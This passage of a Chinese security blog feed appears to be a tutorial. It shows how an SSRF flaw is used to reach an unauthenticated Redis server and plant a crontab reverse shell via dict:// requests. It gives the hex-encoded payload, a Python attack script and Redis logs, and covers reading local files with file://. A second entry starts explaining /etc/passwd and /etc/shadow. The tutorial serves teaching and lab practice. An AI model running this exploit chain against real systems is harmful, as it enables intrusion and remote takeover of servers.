&lt;p&gt;明白利用方法后，我们可以使用dict协议执行命令，例如可以获取redis的变量&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:~&lt;&#x2F;span&gt;&lt;span&gt; margin$ curl dict:&#x2F;&#x2F;192.168.0.67:6379&#x2F;get:name
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-ERR&lt;&#x2F;span&gt;&lt;span&gt; Syntax error, try CLIENT (LIST | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;KILL&lt;&#x2F;span&gt;&lt;span&gt; ip:port | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GETNAME &lt;&#x2F;span&gt;&lt;span&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SETNAME&lt;&#x2F;span&gt;&lt;span&gt; connection-name)
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Margin
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+OK
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过dict协议利用redis的未授权访问反弹shell的步骤如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 1、开启反弹shell的监听
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc -l&lt;&#x2F;span&gt;&lt;span&gt; 9999
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 2、依次执行下面的命令
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt; dict:&#x2F;&#x2F;192.168.0.119:6379&#x2F;set:mars:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\n\n* * * * * root bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.119&#x2F;9999 0&amp;gt;&amp;amp;1\n\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt; dict:&#x2F;&#x2F;192.168.0.119:6379&#x2F;config:set:dir:&#x2F;etc&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt; dict:&#x2F;&#x2F;192.168.0.119:6379&#x2F;config:set:dbfilename:crontab
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt; dict:&#x2F;&#x2F;192.168.0.119:6379&#x2F;bgsave
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;执行时，反弹shell的命令，也就是set:mars:xxx，会因为特殊字符的原因无法写入到目标的redis中，被被空格所分割导致出现一下情况：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1584705879.520734 [0 172.17.0.1:44488] &amp;quot;set&amp;quot; &amp;quot;mars&amp;quot; &amp;quot;\\n\\n*&amp;quot; &amp;quot;*&amp;quot; &amp;quot;*&amp;quot; &amp;quot;*&amp;quot; &amp;quot;*&amp;quot; &amp;quot;root&amp;quot; &amp;quot;bash&amp;quot; &amp;quot;-i&amp;quot; &amp;quot;&amp;gt;&amp;amp;&amp;quot; &amp;quot;&#x2F;dev&#x2F;tcp&#x2F;192.168.0.119&#x2F;6789&amp;quot; &amp;quot;0&amp;gt;&amp;amp;1\\n\\n&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;根据上图我们会发现，命令被分割了，看表象感觉像是被空格分割了。此时将反弹shell的命令进行十六进制转换，变为：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt; dict:&#x2F;&#x2F;192.168.0.119:6379&#x2F;set:mars:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;\\&lt;&#x2F;span&gt;&lt;span&gt;x0a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x72&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x6f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x6f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x74&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x62&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x61&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x73&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x68&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x69&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x3e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x26&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x65&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x76&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x74&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x63&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x70&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x31&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x39&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x31&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x36&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x38&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x31&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x31&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x39&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x39&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x39&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x39&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x39&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x3e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x26&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x31&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;x0a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;以上单引号使用反斜杠\进行转移，其他数据进行十六进制编码，执行结果如下，可以发现没有错误了&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1584706087.980465 [0 172.17.0.1:44490] &amp;quot;set&amp;quot; &amp;quot;mars&amp;quot; &amp;quot;\n* * * * * root bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.119&#x2F;9999 0&amp;gt;&amp;amp;1\n&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;剩下的修改路径和文件名称的请求，正常执行即可，脚本如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;python
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# -*- coding: UTF-8 -*-
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib2,urllib,binascii
&lt;&#x2F;span&gt;&lt;span&gt;url = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;target = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;dict:&#x2F;&#x2F;192.168.0.119:6379&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;cmds = [&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;set:mars:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;n* * * * * root bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.119&#x2F;9999 0&amp;gt;&amp;amp;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,
&lt;&#x2F;span&gt;&lt;span&gt;       &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;config:set:dir:&#x2F;etc&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;       &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;config:set:dbfilename:crontab&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;       &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bgsave&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;cmd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;cmds:
&lt;&#x2F;span&gt;&lt;span&gt;    cmd_encoder = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;single_char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;cmd:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 先转为ASCII
&lt;&#x2F;span&gt;&lt;span&gt;        cmd_encoder += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(single_char)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;    cmd_encoder = binascii.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a2b_hex&lt;&#x2F;span&gt;&lt;span&gt;(cmd_encoder)
&lt;&#x2F;span&gt;&lt;span&gt;    cmd_encoder = urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(cmd_encoder,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    payload = url + target + cmd_encoder
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;payload
&lt;&#x2F;span&gt;&lt;span&gt;    request = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Request&lt;&#x2F;span&gt;&lt;span&gt;(payload)
&lt;&#x2F;span&gt;&lt;span&gt;    response = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;urlopen&lt;&#x2F;span&gt;&lt;span&gt;(request).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;但很多时候我们利用ssrf漏洞去攻击内网服务器的时候，并不知道内网中有什么样的应用、IP地址是多少、开放了什么端口、端口对应的服务是什么。所以需要先对内网做IP+端口的扫描，如果开放的服务是redis才能使用上文讲到的利用方法，对于不同的应用有不同的扫描方法，例如，redis的扫描可以请求以下内容来根据回显内容进行判断是否为redis，其他的服务也是同样道理，只要知道服务的指纹，然后与自己的指纹库进行比对即可：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt; dict:&#x2F;&#x2F;192.168.0.119:6379&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;0x02-filexie-yi&quot;&gt;0x02 file协议&lt;&#x2F;h3&gt;
&lt;p&gt;file协议主要用于访问本地计算机中的文件，命令格式为：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;file:&#x2F;&#x2F;文件路径
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;使用file协议可以直接读取目标操作系统的文件，例如使用以下方法来读取&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624869371771-7e72f093-a07b-4640-aab1-a63680e8883c.png#align=left&amp;amp;display=inline&amp;amp;height=194&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=194&amp;amp;originWidth=1850&amp;amp;size=269518&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1850&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;file协议和http协议有什么区别呢？&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;file协议主要用于读取服务器本地文件，访问的是本地的静态资源&lt;&#x2F;li&gt;
&lt;li&gt;http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析&lt;&#x2F;li&gt;
&lt;li&gt;http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以&lt;&#x2F;li&gt;
&lt;li&gt;file对应的类似http的协议是ftp协议（文件传输协议）&lt;&#x2F;li&gt;
&lt;li&gt;file不能跨域&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Linux系统安全</title>
		<published>2021-06-23T00:00:00+00:00</published>
		<updated>2021-06-23T00:00:00+00:00</updated>
		<link href="https://baz.ee/linuxxi-tong-an-quan/" type="text/html"/>
		<id>https://baz.ee/linuxxi-tong-an-quan/</id>
		<content type="html">&lt;h1 id=&quot;linuxxi-tong-an-quan-zhi-shi-ti&quot;&gt;Linux系统安全知识体&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624467435499-cf4590b9-792e-4e9d-a80f-8ceb458d7755.png#align=left&amp;amp;display=inline&amp;amp;height=504&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1008&amp;amp;originWidth=1694&amp;amp;size=557128&amp;amp;status=done&amp;amp;style=none&amp;amp;width=847&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;yi-zhang-hu-an-quan&quot;&gt;一·账户安全&lt;&#x2F;h1&gt;
&lt;p&gt;在Linux系统中，提供了多种机制来确保用户账号的正确，安全使用。合理地规划用户账号，并合理地分配权限，是保证Linux系统安全的第一步。&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h2 id=&quot;1-zhang-hu-de-ji-ben-gai-nian&quot;&gt;1·账户的基本概念&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;a-zhang-hu-de-xiang-guan-gai-nian&quot;&gt;a·账户的相关概念&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;用户：用户是能够获取系统资源的权限的集合。&lt;&#x2F;li&gt;
&lt;li&gt;组：组是权限的容器。&lt;&#x2F;li&gt;
&lt;li&gt;用户和组的特性：
&lt;ul&gt;
&lt;li&gt;用户必须属于某个组或多个组中。&lt;&#x2F;li&gt;
&lt;li&gt;用户和组为多对多关系。&lt;&#x2F;li&gt;
&lt;li&gt;root用户为最高权限用户&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;用户的类型：
&lt;ul&gt;
&lt;li&gt;超级用户：用户名为root或UID为0的用户，可以修改系统中所有的文件。&lt;&#x2F;li&gt;
&lt;li&gt;系统用户：Linux系统正常工作所必须的内建的用户，不能用来登陆，如：bin, adm, lp等。&lt;&#x2F;li&gt;
&lt;li&gt;普通用户：一般使用的用户，为了业务而生。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;b-zhang-hu-de-xiang-guan-wen-jian&quot;&gt;b·账户的相关文件&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624467688451-2d704116-0d70-4b2e-b994-5415858a8937.png#align=left&amp;amp;display=inline&amp;amp;height=321&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-24%20%E4%B8%8A%E5%8D%8812.59.44.png&amp;amp;originHeight=742&amp;amp;originWidth=640&amp;amp;size=235247&amp;amp;status=done&amp;amp;style=none&amp;amp;width=277&quot; alt=&quot;截屏2021-06-24 上午12.59.44.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;用户信息文件：
&lt;ul&gt;
&lt;li&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;etc&#x2F;shadow &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;组信息文件：
&lt;ul&gt;
&lt;li&gt;&#x2F;etc&#x2F;group&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;etc&#x2F;gshadow&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;etc-passwd&quot;&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;h4&gt;
&lt;p&gt;系统识别用户的文件，所有用户的信息都在文件中记录。&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;admin:x:500:500:admin ad:&#x2F;home&#x2F;admin:&#x2F;bin&#x2F;bash
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;第一字段：用户名（也被称为登录名）。
&lt;&#x2F;span&gt;&lt;span&gt;第二字段：口令；上例为x，实际上密码已经被映射到&#x2F;etc&#x2F;shadow文中。
&lt;&#x2F;span&gt;&lt;span&gt;第三字段：UID；用户ID。
&lt;&#x2F;span&gt;&lt;span&gt;第四字段：GID；用户组ID。
&lt;&#x2F;span&gt;&lt;span&gt;第五字段：用户名全称，可选，可以不设置。
&lt;&#x2F;span&gt;&lt;span&gt;第六字段：用户的家目录所在的位置。
&lt;&#x2F;span&gt;&lt;span&gt;第七字段：用户所用shell的类型。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;etc-shadow&quot;&gt;&#x2F;etc&#x2F;shadow&lt;&#x2F;h4&gt;
&lt;p&gt;passwd的影子文件，两文件互补&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;admin:$1$VE.Bq2Xf$2ccQi7EQ9dp8GKF8gH7PB1:13072:0:99999:7:::
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;第一字段：用户名（也被称为登录名）。
&lt;&#x2F;span&gt;&lt;span&gt;第二字段：密码（已被加密）。
&lt;&#x2F;span&gt;&lt;span&gt;第三字段：上次修改口令的时间（从1970年1月1日起的天数）。
&lt;&#x2F;span&gt;&lt;span&gt;第四字段：两次修改口令间隔最少的天数。
&lt;&#x2F;span&gt;&lt;span&gt;第五字段：两次修改口令间隔最多的天数。
